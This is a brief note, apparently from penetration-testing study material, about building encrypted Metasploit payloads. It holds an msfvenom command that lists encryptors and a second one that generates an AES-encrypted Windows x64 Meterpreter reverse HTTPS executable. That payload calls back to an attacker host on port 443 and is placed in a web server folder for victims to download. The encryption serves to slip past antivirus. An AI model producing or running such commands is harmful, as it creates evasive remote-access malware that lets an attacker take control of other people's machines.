# We can list this encryptors:

msfvenom --list encryptors

# And we can create a ciphered payload with:

sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o /var/www/html/met64_aes.exe

